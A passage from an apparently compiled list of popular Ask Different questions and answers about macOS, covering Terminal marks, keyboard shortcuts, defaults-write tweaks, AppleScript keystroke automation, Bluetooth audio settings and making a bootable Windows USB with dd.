In addition to the automatic marking, you can also manually add marks by selecting a line in the terminal output using the mouse, and then selecting the Edit > Marks > Mark as Prompt menu entry (or Cmd+U).

Use Cases

The Marks functionality is useful if some of your executed commands produce lots of output, and you quickly want to scroll to the position where you entered the command. Pressing Cmd+Up will take you there. Pressing it repeatedly will take you further up, while pressing Cmd+Down will take you back down again. The target location is conveniently highlighted as you jump/scroll around.



Selecting Content

The same marks functionality can be used for selecting Terminal output. Pressing Cmd+Shift+Up will select the content up to the previous mark, while Cmd+Shift+Down will select down to the next mark. This is useful when wanting to copy log output or other content from the Terminal.

This functionality is also available from the Edit > Navigate menu while pressing the Shift key:



Summary

Having used this for a couple of days now, I find it incredibly useful. Scrolling up through hundreds of lines of output to find the beginning of the command's output has suddenly become a lot easier.

I wonder why this new feature isn't mentioned more prominently - I haven't seen it in any of the El Capitan walkthroughs. The Terminal help currently does not provide any details on this feature either.

---

#### 154. Can I see my CPU and memory usage meters in the menu bar?

**问题描述 / Problem Description**:
Tags: macos, menu-bar, activity-monitor | Score: 121 | Views: 217353 | Answers: 28

**解决方案 / Solution**:
One that hasn't been mentioned yet is Stats, which describes itself as a

Simple macOS system monitor in your menu bar

It's an excellent open source project (https://github.com/exelban/stats) that can be installed via:
brew install stats


On big sur, after downloading, open launchpad, search for 'stats', and open it. It will start showing up in the menu bar.

---

#### 155. runaway distnoted process

**问题描述 / Problem Description**:
Tags: launchd, macos | Score: 121 | Views: 116201 | Answers: 14

**解决方案 / Solution**:
I've seen this too.  Emacs 24.3.1, Mavericks 10.9.

I've found that the distnoted process calms down within seconds after I quit out of Emacs.

I've filed an Emacs bug here: http://permalink.gmane.org/gmane.emacs.bugs/80836

---

#### 156. Is there a keyboard shortcut to bring up Finder?

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 120 | Views: 171484 | Answers: 20

**解决方案 / Solution**:
It's actually easy. On Yosemite, just press option ⌥+command ⌘+spacebar. That will open a new Smart Finder window. You then can navigate from there. It works on a system level no matter what application you're running. 

No need for scripts or complicated setups. 

Turn this option on in System Preferences > keyboard > shortcuts > spotlight > "show finder search window" in recent versions. This can be mapped to other keys too, but it can cause conflicts in other apps that might be using your desired shortcut.

---

#### 157. Make the Menu Bar never show while in Full Screen

**问题描述 / Problem Description**:
Tags: macos, menu-bar, fullscreen | Score: 120 | Views: 62314 | Answers: 9

**解决方案 / Solution**:
Refer to the original page for detailed solutions and community answers.

---

#### 158. How do I automate a key press in AppleScript?

**问题描述 / Problem Description**:
Tags: macos, mac, applescript | Score: 119 | Views: 256210 | Answers: 1

**解决方案 / Solution**:
Run a script like this in AppleScript Editor:

activate application "Firefox"
repeat 100 times
    tell application "System Events" to keystroke "a" using command down
    delay (random number from 0.5 to 5)
end repeat


More examples:

tell application "System Events"
    key code 123 using {shift down, command down} -- shift-command-left
end




set old to (path to frontmost application as text)
tell application "Notes"
    reopen
    activate
end tell
tell application "System Events" to keystroke "f" using {control down, command down}
delay 1
activate application old




delay 0.5 -- time to release modifier keys if for example the script is run with command-R
tell application "System Events" to tell process "Notification Center"
    try
        key down option
        delay 0.1
        click menu bar item 1 of menu bar 1
    end try
    key up option
end tell


See Events.h for a list of key codes.


  $ grep '^ *kVK' /System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/Headers/Events.h|tr -d ,|while read x y z;do printf '%d %s %s\n' $z $z ${x#kVK_};done|sort -n
  0 0x00 ANSI_A
  1 0x01 ANSI_S
  2 0x02 ANSI_D
  3 0x03 ANSI_F
  4 0x04 ANSI_H
  5 0x05 ANSI_G
  6 0x06 ANSI_Z
  7 0x07 ANSI_X
  8 0x08 ANSI_C
  9 0x09 ANSI_V
  10 0x0A ISO_Section
  11 0x0B ANSI_B
  12 0x0C ANSI_Q
  13 0x0D ANSI_W
  14 0x0E ANSI_E
  15 0x0F ANSI_R
  16 0x10 ANSI_Y
  17 0x11 ANSI_T
  18 0x12 ANSI_1
  19 0x13 ANSI_2
  20 0x14 ANSI_3
  21 0x15 ANSI_4
  22 0x16 ANSI_6
  23 0x17 ANSI_5
  24 0x18 ANSI_Equal
  25 0x19 ANSI_9
  26 0x1A ANSI_7
  27 0x1B ANSI_Minus
  28 0x1C ANSI_8
  29 0x1D ANSI_0
  30 0x1E ANSI_RightBracket
  31 0x1F ANSI_O
  32 0x20 ANSI_U
  33 0x21 ANSI_LeftBracket
  34 0x22 ANSI_I
  35 0x23 ANSI_P
  36 0x24 Return
  37 0x25 ANSI_L
  38 0x26 ANSI_J
  39 0x27 ANSI_Quote
  40 0x28 ANSI_K
  41 0x29 ANSI_Semicolon
  42 0x2A ANSI_Backslash
  43 0x2B ANSI_Comma
  44 0x2C ANSI_Slash
  45 0x2D ANSI_N
  46 0x2E ANSI_M
  47 0x2F ANSI_Period
  48 0x30 Tab
  49 0x31 Space
  50 0x32 ANSI_Grave
  51 0x33 Delete
  53 0x35 Escape
  55 0x37 Command
  56 0x38 Shift
  57 0x39 CapsLock
  58 0x3A Option
  59 0x3B Control
  60 0x3C RightShift
  61 0x3D RightOption
  62 0x3E RightControl
  63 0x3F Function
  64 0x40 F17
  65 0x41 ANSI_KeypadDecimal
  67 0x43 ANSI_KeypadMultiply
  69 0x45 ANSI_KeypadPlus
  71 0x47 ANSI_KeypadClear
  72 0x48 VolumeUp
  73 0x49 VolumeDown
  74 0x4A Mute
  75 0x4B ANSI_KeypadDivide
  76 0x4C ANSI_KeypadEnter
  78 0x4E ANSI_KeypadMinus
  79 0x4F F18
  80 0x50 F19
  81 0x51 ANSI_KeypadEquals
  82 0x52 ANSI_Keypad0
  83 0x53 ANSI_Keypad1
  84 0x54 ANSI_Keypad2
  85 0x55 ANSI_Keypad3
  86 0x56 ANSI_Keypad4
  87 0x57 ANSI_Keypad5
  88 0x58 ANSI_Keypad6
  89 0x59 ANSI_Keypad7
  90 0x5A F20
  91 0x5B ANSI_Keypad8
  92 0x5C ANSI_Keypad9
  93 0x5D JIS_Yen
  94 0x5E JIS_Underscore
  95 0x5F JIS_KeypadComma
  96 0x60 F5
  97 0x61 F6
  98 0x62 F7
  99 0x63 F3
  100 0x64 F8
  101 0x65 F9
  102 0x66 JIS_Eisu
  103 0x67 F11
  104 0x68 JIS_Kana
  105 0x69 F13
  106 0x6A F16
  107 0x6B F14
  109 0x6D F10
  111 0x6F F12
  113 0x71 F15
  114 0x72 Help
  115 0x73 Home
  116 0x74 PageUp
  117 0x75 ForwardDelete
  118 0x76 F4
  119 0x77 End
  120 0x78 F2
  121 0x79 PageDown
  122 0x7A F1
  123 0x7B LeftArrow
  124 0x7C RightArrow
  125 0x7D DownArrow
  126 0x7E UpArrow


You can also use AppleScript to click menu items:

tell application "System Events" to tell (process 1 where frontmost is true)
    click menu item "Minimize" of menu 1 of menu bar item "Window" of menu bar 1
end tell




tell application "System Events" to tell process "Finder"
    set frontmost to true
    tell menu bar item 3 of menu bar 1
        click
        click menu item "Open With" of menu 1
    end tell
end tell

---

#### 159. What tiny thing in iOS 5 makes you smile, or has caught you off guard?

**问题描述 / Problem Description**:
Tags: ios, macos | Score: 117 | Views: 22520 | Answers: 57

**解决方案 / Solution**:
Usage shows how much space each app is using

Settings -> General -> Usage

iOS 5 now collects the space used by apps and the data in the app - sorted by the largest size. If you need to free up some space quickly, this is a great way to easily identify and remove the largest burdens on your storage space.

 
 


Of specific tiny note, the edit button in the top right allows you to delete selective content from apps like Music.

---

#### 160. macOS: Disable popup showing accented characters when holding down a key

**问题描述 / Problem Description**:
Tags: high-sierra, macos | Score: 117 | Views: 94454 | Answers: 3

**解决方案 / Solution**:
In macOS, when a key is held down while entering text, a popup is shown which lets one choose between various accented forms of the character. To disable this execute the following command line in the Terminal.app:
defaults write -g ApplePressAndHoldEnabled -bool false

Now, you'll need to log out and log back in. This should disable the display of the popup and character typed should start repeating when the key is held down.
If you ever wish to return to this behaviour, execute the following command line in the Terminal.app:
defaults write -g ApplePressAndHoldEnabled -bool true

You'll need to log out and log back in again for the setting to take effect.

---

#### 161. El Capitan, expand desktop thumbnails by default in Mission Control

**问题描述 / Problem Description**:
Tags: mission-control, macos | Score: 117 | Views: 23268 | Answers: 17

**解决方案 / Solution**:
Refer to the original page for detailed solutions and community answers.

---

#### 162. How to decrease .pdf size without losing quality

**问题描述 / Problem Description**:
Tags: macos, pdf, preview | Score: 115 | Views: 112149 | Answers: 10

**解决方案 / Solution**:
The problem is - the default filter used during conversion has very low conversion settings.
Thankfully, a custom filter can be added.
Adding custom filter step by step

Create a new directory (if you don't have it) - /Library/Filters

Note that you could use ~/Library/Filters, instead.


Add there a new filter file with unique filter - i.e. Reduce Size with good quality.qfilter
The file should contain XML with new filter - you can base on the /System/Library/Filters/Reduce File Size.qfilter file or use my below example. Change compression setting, image size and add unique display name for your filter.

Filter file structure/example

I marked key settings by comments.
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;Domains&lt;/key&gt;
    &lt;dict&gt;
        &lt;key&gt;Applications&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;Printing&lt;/key&gt;
        &lt;true/&gt;
    &lt;/dict&gt;
    &lt;key&gt;FilterData&lt;/key&gt;
    &lt;dict&gt;
        &lt;key&gt;ColorSettings&lt;/key&gt;
        &lt;dict&gt;
            &lt;key&gt;DocumentColorSettings&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;CustomLHSCorrection&lt;/key&gt;
                &lt;array&gt;
                    &lt;integer&gt;8&lt;/integer&gt;
                    &lt;integer&gt;8&lt;/integer&gt;
                    &lt;integer&gt;8&lt;/integer&gt;
                &lt;/array&gt;
            &lt;/dict&gt;
            &lt;key&gt;ImageSettings&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;Compression Quality&lt;/key&gt;
    &lt;!-- ====== Set your custom quality &lt;0,1&gt; ======= --&gt;
                &lt;real&gt;0.75&lt;/real&gt;
                &lt;key&gt;ImageCompression&lt;/key&gt;
                &lt;string&gt;ImageJPEGCompress&lt;/string&gt;
                &lt;key&gt;ImageScaleSettings&lt;/key&gt;
                &lt;dict&gt;
                    &lt;key&gt;ImageScaleFactor&lt;/key&gt;
    &lt;!-- ====== Set your scale factor &lt;0,1&gt; ======= --&gt;                 
                    &lt;real&gt;0.75&lt;/real&gt;
                    &lt;key&gt;ImageScaleInterpolate&lt;/key&gt;
                    &lt;true/&gt;
    &lt;!-- ====== Set what sizes your images can reach ======= --&gt;                    
                    &lt;key&gt;ImageSizeMax&lt;/key&gt;
                    &lt;integer&gt;1684&lt;/integer&gt;
                    &lt;key&gt;ImageSizeMin&lt;/key&gt;
                    &lt;integer&gt;1200&lt;/integer&gt;
                &lt;/dict&gt;
            &lt;/dict&gt;
        &lt;/dict&gt;
    &lt;/dict&gt;
    &lt;key&gt;FilterType&lt;/key&gt;
    &lt;integer&gt;1&lt;/integer&gt;
    &lt;key&gt;Name&lt;/key&gt;
&lt;!-- ====== Set unique display name for your filter ======= --&gt;
    &lt;string&gt;Reduce Size Good Quality&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;

Result
Select your new filter when exporting file.


Helpful articles:

https://www.macworld.com/article/1168311/software/shrink-preview-files-without-ruining-image-quality.html

---

#### 163. How to use pip after the OS X El Capitan upgrade?

**问题描述 / Problem Description**:
Tags: macos, permission, python, authorization | Score: 115 | Views: 171062 | Answers: 12

**解决方案 / Solution**:
A quick solution is to use homebrew to install python into /usr/local/bin so that your pip can run against a user-modifiable python framework.

brew install python
pip --version


Disabling System Integrity Protection is also an option, but I don't recommend that for anything but professionally managed and fire walled servers where you have the manpower to manage intrusion detection or if you are a developer/sysadmin and need to test things with and without SIP.

ls -lO /System/Library/Frameworks/Python.framework/Versions/2.7/
csrutil status


You will see that the restricted flag is set which cannot be removed even as root while SIP is engaged.

Using homebrew makes it possible to manage pip and python separately than the system provided version. As a bonus, the homebrew framework is designed to ease maintainance and patch/chores via automation.

---

#### 164. How to show hidden files and folders in Finder?

**问题描述 / Problem Description**:
Tags: finder, macos | Score: 115 | Views: 85173 | Answers: 4

**解决方案 / Solution**:
I don't think you can set this for individual folders. To set it globally, so that Finder always shows hidden files, run Terminal and enter the following two commands:
defaults write com.apple.finder AppleShowAllFiles true
killall Finder

To switch back, do the same but substitute false for true.
This works all the way through macOS Catalina (and betas for Big Sur).

---

#### 165. Is there a Google Calendar Mac Desktop App?

**问题描述 / Problem Description**:
Tags: macos, google-calendar | Score: 115 | Views: 638088 | Answers: 6

**解决方案 / Solution**:
Here's another way, adding Google Calendar as a Chrome App with standalone window. The calendar is then available in Launchpad and the Dock.

Navigate Chrome to your calendar URL, e.g https://calendar.google.com
Create Chrome App shortcut from the URL - Chrome drop down menu (3 dots icon on top right) &gt; Save and Share &gt; Create Shortcut



Note: check the &quot;Open as window&quot; box


Open the &quot;Google Calendar&quot; from Chrome Apps or Launchpad!



Select &quot;Keep in Dock&quot; to keep the calendar icon in the MacOS Dock (optional)


That's it! Your Google Calendar App is now available as a standalone window app from the MacOS Dock and Launchpad.

---

#### 166. VirtualBox 5.1.28 fails to install on MacOS 10.13 due to KEXT security

**问题描述 / Problem Description**:
Tags: macos, security, virtualbox, high-sierra, kernel-extensions | Score: 114 | Views: 126759 | Answers: 6

**解决方案 / Solution**:
Managed to solve it.


Eject the VirtualBox image from: Finder > Devices


Now allow the exception in: System Preferences > Security &amp; Privacy


Finally but not least click Allow button so that way the developer with the name "Oracle America, Inc" will be accepted and the installer using that certificate will run just fine (basically this installer is signed using "Oracle America, Inc" certificate so we are required to enable it use on our machine first)
Then try to install from the .dmg again so that it remounts the device.


Now its working fine for me.

---

#### 167. Yosemite bluetooth audio is choppy/skips

**问题描述 / Problem Description**:
Tags: macbook-pro, macos, audio, bluetooth | Score: 114 | Views: 126425 | Answers: 3

**解决方案 / Solution**:
It's an issue with the amount of power/bandwidth supplied to the BluetoothAudioAgent, the daemon in charge of streaming. Apparently most people have had success by entering the following command in terminal.app: 

defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Min (editable)" -int 40

Source: http://lifehacker.com/fix-your-bluetooth-audio-in-yosemite-with-this-terminal-1670380974

The source article lists Yosemite as the specific OS this applies to, but I know that this fix also works back to Mavericks and (possibly) Snow Leopard (untested).

I am having this exact issue at the moment and entered that command with non-noticeable results. I'm going to reboot the machine and see if that takes the new settings into account. But it seems like this command is the way that the wide majority of people have resolved this issue. 

EDIT: Just rebooted, the audio quality is significantly better. No noticeable choppiness whatsoever (knock on wood). It appears that the command I posted above does seem to resolve the issue. 

EDIT 2 (2015-8-24): The above command does help in many cases and produces noticeable quality improvements. Unfortunately, however, Yosemite is very moody with regard to bluetooth audio. The problem compounds itself when in proximity of other bluetooth devices. To expand on my previous answer above, I highly recommend entering the following additional commands to increase other bluetooth audio parameters:

defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Max (editable)" 80 
defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Min (editable)" 48 
defaults write com.apple.BluetoothAudioAgent "Apple Initial Bitpool (editable)" 40 
defaults write com.apple.BluetoothAudioAgent "Apple Initial Bitpool Min (editable)" 40 
defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool" 58 
defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool Max" 58 
defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool Min" 48


EDIT 3 (2015-9-08): Alright. I'm sorry I keep updating this answer, but I keep finding more information about this issue (since improving bluetooth audio on Yosemite is a long-term effort, apparently). I've found several sources that cut straight to the mustard and set everything to 80 which appears to be the maximum allowable value for Bitpool settings. If the above settings don't work well enough for you, try the "All In&trade;" approach.

defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Max (editable)" 80 
defaults write com.apple.BluetoothAudioAgent "Apple Bitpool Min (editable)" 80 
defaults write com.apple.BluetoothAudioAgent "Apple Initial Bitpool (editable)" 80 
defaults write com.apple.BluetoothAudioAgent "Apple Initial Bitpool Min (editable)" 80 
defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool" 80 
defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool Max" 80 
defaults write com.apple.BluetoothAudioAgent "Negotiated Bitpool Min" 80


To see your current defaults:

defaults read com.apple.BluetoothAudioAgent


Edit 4 (2016-07-14): One more (hopefully last) edit. Make sure that you restart the bluetoothaudiod (or coreaudiod) service after making changes to these settings. 

sudo killall bluetoothaudiod


Or, if you are on El Capitan:

sudo killall coreaudiod


Credit for this goes to the multiple wise nerds below who suggested it. (Thank you!)

---

#### 168. How to make right click for the selected content using only keyboard on a Mac?

**问题描述 / Problem Description**:
Tags: macos, keyboard, shortcut, contextual-menu | Score: 114 | Views: 105261 | Answers: 11

**解决方案 / Solution**:
I don't know any way to show a context menu for items selected with the keyboard like what the menu key does in Windows.

To assign a keyboard shortcut for performing a secondary click at the current coordinates of the pointer, you can either:


Use a private.xml like this with Karabiner:

&lt;?xml version="1.0"?&gt;
&lt;root&gt;
  &lt;item&gt;
    &lt;name&gt;Right Mousebutton&lt;/name&gt;
    &lt;identifier&gt;rightMouseButton&lt;/identifier&gt;
    &lt;autogen&gt;__KeyToKey__ KeyCode::OPTION_R, PointingButton::RIGHT&lt;/autogen&gt;
  &lt;/item&gt;
&lt;/root&gt;

Use BetterTouchTool:


Use Keyboard Maestro:


Download MouseTools and assign a shortcut to MouseTools -rightClick.

---

#### 169. reattach terminal tab to another window

**问题描述 / Problem Description**:
Tags: terminal | Score: 114 | Views: 52605 | Answers: 6

**解决方案 / Solution**:
You need to, in the window you want to move, go to View-> Show Tab Bar (if the tab bar isn't showing already).

Then, drag the tab of the window you want to move onto the window you want to move it to.

Update for iTerm 2: In iTerm 2 the setting is no longer exposed in the View menu.  Go to iTerm > Preferences > Appearance > Tabs and check "Show tab bar even when there is only one tab". Note that in early releases of iTerm 2 the setting was "Hide tab bar when there is only one tab".

---

#### 170. How to type a NORMAL tilde sign (~) in Mac?

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 113 | Views: 574154 | Answers: 12

**解决方案 / Solution**:
You type the accent tilde (shift `) then space: ~

---

#### 171. How to add permanent environment variable in zsh

**问题描述 / Problem Description**:
Tags: macos, python, zsh, environment-variables | Score: 113 | Views: 331058 | Answers: 7

**解决方案 / Solution**:
Bash

Since Bash is typically the default shell you can open up this file in your home directory:

$ vim ~/.bash_profile


And add your variable to this file:

export ENV_VAR=12345


You can do this without even having to edit this file if you like, using the following one-liner:

$ echo 'export ENV_VAR=12345' &gt;&gt; ~/.bash_profile


And then confirm like so:

$ cat ~/.bash_profile
for i in ~/.bash_profile.d/[0-9]*; do
  . "$i"
done
export ENV_VAR=12345


After doing the above, if you open a new terminal you should see that environment variable has been set:

$ echo $ENV_VAR
12345


Zsh

If you find that you're using an alternative shell such as zsh, that uses a different set of configuration files maintained within your home directory, ~. Luckily the syntax of the changes is basically the same, just different files. So you can add the above example to this file instead:

$ echo 'export ENV_VAR=12345' &gt;&gt; ~/.zshenv


And then when you launch a zsh:

$ echo $ENV_VAR
12345


References


Zsh Startup Files

---

#### 172. macOS: Navigating between desktops using keyboard shortcuts

**问题描述 / Problem Description**:
Tags: macos, shortcut, desktop, mission-control, navigation | Score: 113 | Views: 320011 | Answers: 5

**解决方案 / Solution**:
On macOS Monterey 12 or earlier:

Go to System Preferences app → Keyboard → Shortcuts and you can assign keyboard shortcuts to move across Spaces (desktops).


On macOS Ventura 13 or later:

Go to System Settings app → Keyboard Shortcuts... and you can assign keyboard shortcuts to move across Spaces (desktops).


You can also use the F3 (Mission Control) key on your Mac's keyboard to get a birds eye view of all the Spaces (desktops in Mac parlance) and quickly and directly switch to the desired one. However, this will also involve using the mouse/trackpad.
If you are looking for a 3rd-party tool which lets you customize keyboard shortcuts with much fine grain control, a popular app among users of macOS is Karabiner.

---

#### 173. How do you force a 5 GHz wifi connection?

**问题描述 / Problem Description**:
Tags: macos, wifi, airport | Score: 113 | Views: 305933 | Answers: 14

**解决方案 / Solution**:
In short: you can not force a frequency band in OS X 10.9 Mavericks. (On 10.5 you could...)
You want to connect to the device using Basic Service Set Identification (BSSID) instead of the regular Service Set Identification (SSID). Connecting to a BSSID will connect you to a specific device regardless of the connection strength. Connecting to SSID will only connect you to a specific network name and if similar network names are available, it would connect to the best signal/noise ratio. It must be noted that your OS X chooses the wlan, not your router, and OS X switches to the strongest signal available (2.4GHz or 5GHz).
To find a specific SSID and BSSID combination, you can run:
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport scan

Before OSX 10.6 you could connect to a specific BSSID using:
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport --associate=XXX --bssid=YYY

Where XXX is the SSID/network name and YYY the MAC address of the base station you want to talk to.
On OS X 10.6 and beyond it is no longer possible to connect to BSSID directly. There is no known API for this and no third party Software exists that can do this. So you need to change your 5GHz SSID to a unique name or you need to go back to OS X 10.5, or you can change the 2.4GHz channel from within the router. I think these options are non-valid in your case.
UPDATE As maxim points out, you can force a frequency band and use that to fix to 5GHz.
On linux you can use iwconfig, but this tool is not available for OS X.

---

#### 174. Right-click, create a new text file. How?

**问题描述 / Problem Description**:
Tags: macos, finder, contextual-menu | Score: 113 | Views: 145494 | Answers: 12

**解决方案 / Solution**:
I am using XtraFinder plugin for Mac OS's built in Finder. It has most of the features including create new file in finder options.

You'll love it like I do

;)

---

#### 175. Creating A Bootable USB Of Windows 8.1 On OS X?

**问题描述 / Problem Description**:
Tags: macos, bootcamp, usb, startup, windows | Score: 112 | Views: 259697 | Answers: 3

**解决方案 / Solution**:
I am not really sure why you would want to install Windows 8.1 without BootCamp.

The USB stick needs to be a little bigger than the .iso file you are going to be burning. It doesn't matter if there is any data on it, this will totally erase the whole thing.



Steps To Achieve Victory


Download the ISO you want to use
Open Terminal (in /Applications/Utilities)

2.1 Navigate to the path where the .iso file is located

2.2 Use ls to list all the folders 

2.3 cd /path/to/iso to dive in to folder or cd .. to go back the path  
Convert .iso to .img using hdiutil:
hdiutil convert -format UDRW -o /path/to/target.img /path/to/source.iso
Rename if OS X gave it a .dmg ending:
mv /path/to/target.img.dmg path/to/target.img
Type diskutil list to get a list of currently connected devices
Insert USB drive you want to use
Run diskutil list again to see what your USB stick gets assigned
eg - /dev/disk3
Run diskutil unmountDisk /dev/diskN (where N is the number assigned to your USB stick, in previous example it would be 3)
Run sudo dd if=/path/to/target.img of=/dev/diskN bs=1m (if you get an error, replace bs=1m with bs=1M
Run diskutil eject /dev/diskN and remove your USB stick
The USB stick will now be ready to use




IMPORTANT For the step #9 you can use the destination to /dev/rdiskN to reduce the copy time.

NOTE: Sometimes, not always, Step #4 will be necessary. Not all the time. I am not sure why it will add the .dmg ending and other times leave it alone.

NOTE 2: Might I suggest you learn the name of the .iso you downloaded, or just rename it win8.1.iso or something, and put it on your Desktop folder. That way, when you are typing commands like #3 and #4 etc, etc, you can type it like this:

hdiutil convert -format UDRW -o ~/Desktop/win8.1.img ~/Desktop/win8.1.iso


and 

mv ~/Desktop/win8.1.img.dmg ~/Desktop/win8.1.img


and step #9 would look like this:

sudo dd if=~/Desktop/win8.1.img of=/dev/diskN bs=1m




IMPORTANT - You can track the progress by pressing CTRL + T It will show the process info and records in and out, since we use the bs=1m each record is 1Mb in size so you can easily track the progress.



I don't mean to be insulting with Note and Note2, I am just making sure that you know what all these commands mean. It's the simplest method. Unless someone else comes up with something better.

---

#### 176. How to copy path of a file in Mac OS?

**问题描述 / Problem Description**:
Tags: macos | Score: 111 | Views: 277660 | Answers: 1

**解决方案 / Solution**:
All you need to do to copy any items path name directly to the clipboard from anywhere in the file system:

Navigate to the file or folder you wish to copy the path for Right-click (or Control+Click, or a Two-Finger click on trackpads) on the file or folder in the Mac Finder
While in the right-click menu, hold down the OPTION key to reveal the “Copy (item name) as Pathname” option, it replaces the standard Copy option Once selected, the file or folders path is now in the clipboard, ready to be pasted anywhere

The copied pathname is always the complete path, it’s not relative.
You can get the same result with a keyboard shortcut of Command+Option+C.
Source http://osxdaily.com/2015/11/05/copy-file-path-name-text-mac-os-x-finder/

---

#### 177. Where can I find default Microsoft fonts Calibri, Cambria?

**问题描述 / Problem Description**:
Tags: macos, ms-office, font, font-book | Score: 111 | Views: 244123 | Answers: 5

**解决方案 / Solution**:
To find and install default Microsoft fonts on a Mac:

Navigate HERE in your browser.
Download the .ZIP file.
Unzip it (double-click it).
Open the folder that appears.
Select all the .TTF files inside the folder.
With the files selected, right-click.
From the pop-up menu, choose &quot;open with → Font Book&quot;.
Click &quot;Install Font&quot; for each font.

Note: Changes to fonts take effect when an application is opened or a user logs in to the account or computer on which the changes occurred, see support.apple.com.

---

#### 178. No partition scheme option when erasing a USB disk in MacOS High Sierra?

**问题描述 / Problem Description**:
Tags: macos, partition | Score: 110 | Views: 196975 | Answers: 1

**解决方案 / Solution**:
I thought I had the same issue but it's probably because in the view options at the top left corner of the Disk Utility window, "Show Only Volumes" is selected. 

In order to change the partition map, it seems you have to select the actual disk. So simply select view - show all devices, then select the actual drive you're trying to reformat, then when trying to erase, you should have the option to choose a partition scheme. 

Hope this helps!

---

#### 179. Why is my host name wrong at the Terminal prompt when connected to a public WiFi network?

**问题描述 / Problem Description**:
Tags: terminal, network, sharing | Score: 110 | Views: 149693 | Answers: 5

**解决方案 / Solution**:
Type in Terminal:

scutil --get HostName


If there's no HostName available, what you see is probably coming from the DNS or DHCP server.  

Set your HostName with:

sudo scutil --set HostName 'yourHostName'


That should do it.

---

#### 180. OS X Terminal &quot;must have&quot; utilities

**问题描述 / Problem Description**:
Tags: macos, mac, terminal, utilities | Score: 109 | Views: 199906 | Answers: 25

**解决方案 / Solution**:
Homebrew

The missing package manager for OS X.

It is an amazing package manager, very light and easy to use. KIS Principle, that makes me think of archlinux. Its community is big and very active.
(see also macports which brew doesn't replace completely, I prefer installing packages with brew, but some complex ones are only on macports)
See also brew tap command which provides some missing formulas that can be useful like when you need latest php version &gt; brew tap josegonzalez/php.
(Homebrew has a policy of not replacing system components, but hey, sometimes you have to)

---

#### 181. how to find out the start time of last sleep

**问题描述 / Problem Description**:
Tags: macos, mac, sleep-wake | Score: 109 | Views: 79405 | Answers: 4

**解决方案 / Solution**:
Actually, something like
pmset -g log|grep -e &quot; Sleep  &quot; -e &quot; Wake  &quot;

is what really gives me a clean timeline of sleep/wake events on 10.8.2. powerd does not log anything about it, at least on my system (10.8.2, MacBook Pro Retina 15).
02/03/13 19:48:37 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              26 secs   
02/03/13 19:49:03 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              27 secs   
02/03/13 19:49:30 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              26 secs   
02/03/13 19:49:56 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              26 secs   
02/03/13 19:50:22 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              26 secs   
02/03/13 19:50:48 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:99%)                              26 secs   
02/03/13 19:51:14 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:100%)                             1802 secs 
02/03/13 20:39:17 GMT-03 Sleep      Maintenance Sleep Sleep: Using BATT (Charge:100%)                           244 secs  
02/03/13 20:43:21 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:100%)                             51 secs   
02/03/13 21:07:17 GMT-03 Sleep      Maintenance Sleep Sleep: Using BATT (Charge:100%)                           242 secs  
02/03/13 21:11:19 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:100%)                             1103 secs 
02/03/13 21:29:42 GMT-03 Wake       Wake due to EC.LidOpen/Lid Open: Using AC (Charge:100%)                     
03/03/13 00:00:26 GMT-03 Sleep      Idle Sleep Sleep: Using BATT (Charge:85%)                                   96 secs   
03/03/13 00:02:02 GMT-03 Sleep      Maintenance Sleep Sleep: Using AC (Charge:85%)                              38 secs   
03/03/13 00:02:40 GMT-03 Wake       Wake due to EHC1/HID Activity: Using AC (Charge:85%)                        4338 secs 
03/03/13 01:14:58 GMT-03 Sleep      Clamshell Sleep to DarkWake: Using AC (Charge:100%)                         48382 secs
03/03/13 14:41:20 GMT-03 Wake       DarkWake to FullWake due to HID Activity: Using AC (Charge:100%)            728 secs  
03/03/13 14:53:28 GMT-03 Sleep      Clamshell Sleep to DarkWake: Using AC (Charge:100%)                         415 secs  
03/03/13 15:00:23 GMT-03 Wake       DarkWake to FullWake due to HID Activity: Using AC (Charge:100%)            718 secs  
03/03/13 15:12:21 GMT-03 Sleep      Clamshell Sleep to DarkWake: Using AC (Charge:100%)                         156 secs  
03/03/13 15:14:57 GMT-03 Wake       DarkWake to FullWake due to HID Activity: Using AC (Charge:100%)            834 secs  
03/03/13 15:28:51 GMT-03 Sleep      Clamshell Sleep to DarkWake: Using AC (Charge:100%)                         378 secs 
03/03/13 15:35:09 GMT-03 Wake       DarkWake to FullWake due to HID Activity: Using AC (Charge:100%)

---

#### 182. MacBook Pro Bluetooth Audio balance keeps changing by itself

**问题描述 / Problem Description**:
Tags: macos, audio, bluetooth | Score: 109 | Views: 54656 | Answers: 2

**解决方案 / Solution**:
This is not the solution to the bug, however, there is an open source MacOS app that is a workaround. It watches for balance changes and centres immediately.

Disclaimer: I made the application. I had similar problems with both Bluetooth headphones and normal headphones.

---

